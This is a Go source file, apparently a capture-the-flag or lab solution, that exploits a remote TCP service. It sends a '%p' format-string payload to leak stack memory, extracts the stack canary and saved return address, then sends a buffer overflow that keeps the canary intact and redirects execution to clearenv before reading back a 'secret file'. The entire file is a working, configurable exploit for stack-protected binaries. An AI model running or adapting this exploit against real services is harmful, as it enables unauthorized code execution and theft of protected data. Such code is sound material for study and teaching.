package main

import (
	"bytes"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
)

func main() {
	log.SetFlags(0)

	bufLenBytes := flag.Int(
		"l",
		104,
		"The length of the buf variable in bytes")
	csCanaryIndex := flag.Int(
		"c",
		39,
		"The index of the call stack canary in the format string output")
	numChunksUntilRIP := flag.Int(
		"r",
		3,
		"The number of memory chunks between the canary and RIP")

	flag.Parse()

	if flag.NArg() != 2 {
		log.Fatalln("please specify the address to connect to and the address of clearenv")
	}

	flag.VisitAll(func(f *flag.Flag) {
		if f.Value.String() == "" || f.Value.String() == "0" {
			log.Fatalf("please specify '-%s' - %s", f.Name, f.Usage)
		}
	})

	serverAddr := flag.Arg(0)
	clearenvAddr := fmtOutputToBytesOrExit([]byte(flag.Arg(1)))
	fmtStr := bytes.Repeat([]byte("%p"), *bufLenBytes/2)

	output, err := dialAndSendBytes(serverAddr, fmtStr)
	if err != nil {
		log.Fatalf("failed to send initial payload - %s", err)
	}

	output = bytes.ReplaceAll(output, []byte("(nil)"), []byte("0x00"))
	memoryChunks := bytes.Split(output, []byte("0x"))
	// Start at index 1 to skip "incorrect password: ".
	memoryChunks = memoryChunks[1:]

	log.Printf("initial output from vulnerable program: '%s'", output)

	exploitPayload := bytes.Repeat([]byte{0x41}, *bufLenBytes)

	csCanary := fmtOutputToBytesOrExit(memoryChunks[*csCanaryIndex])
	log.Printf("call stack canary: '0x%x'", csCanary)
	exploitPayload = append(exploitPayload, wrongEndian(csCanary)...)

	for i := 0; i < *numChunksUntilRIP; i++ {
		garbage := fmtOutputToBytesOrExit(memoryChunks[*csCanaryIndex+i+1])
		log.Printf("preserving chunk: '0x%x'", garbage)
		exploitPayload = append(exploitPayload, wrongEndian(garbage)...)
	}

	rip := fmtOutputToBytesOrExit(memoryChunks[*csCanaryIndex+*numChunksUntilRIP+1])
	log.Printf("existing return instruction pointer: '0x%x'", rip)

	exploitPayload = append(exploitPayload, wrongEndian(clearenvAddr)...)
	log.Printf("clearenv address: '0x%x'", clearenvAddr)

	exploitPayload = append(exploitPayload, wrongEndian(rip)...)

	log.Printf("sending payload: 0x%x", exploitPayload)
	_, err = dialAndSendBytes(serverAddr, exploitPayload)
	if err != nil {
		log.Fatalf("failed to send exploit payload - %s", err)
	}

	log.Println("getting secret file contents...")
	fileContents, err := dialAndSendBytes(serverAddr, []byte("\n"))
	if err != nil {
		log.Fatalf("failed to get file contents - %s", err)
	}

	log.Printf("secret file contents: '%s'", fileContents)
}

func dialAndSendBytes(serverAddr string, b []byte) ([]byte, error) {
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		return nil, fmt.Errorf("failed to dial - %w", err)
	}
	defer conn.Close()

	_, err = conn.Write(b)
	if err != nil {
		return nil, fmt.Errorf("failed to write data - %w", err)
	}

	output, err := io.ReadAll(conn)
	if err != nil {
		return nil, fmt.Errorf("failed to read all output - %w", err)
	}

	return output, nil
}

func fmtOutputToBytesOrExit(b []byte) []byte {
	var tmp []byte
	for i := range b {
		// Only include hex characters (0-9, A-F, a-f).
		if (b[i] > 0x29 && b[i] < 0x3a) || (b[i] > 0x40 && b[i] < 0x47) || (b[i] > 0x60 && b[i] < 0x67) {
			tmp = append(tmp, b[i])
		}
	}

	tmpStr := string(tmp)
	if len(tmp)%2 != 0 {
		tmpStr = "0" + tmpStr
	}

	addr, err := hex.DecodeString(tmpStr)
	if err != nil {
		log.Fatalf("failed to hex decode '%s' - %s", b, err)
	}

	finalAddr := make([]byte, 8)
	if len(addr) < 8 {
		copy(finalAddr[8-len(addr):], addr)
	} else {
		finalAddr = addr
	}

	return finalAddr
}

func wrongEndian(src []byte) []byte {
	dst := make([]byte, 8)
	for i := 0; i < 8; i++ {
		dst[8-1-i] = src[i]
	}
	return dst
}
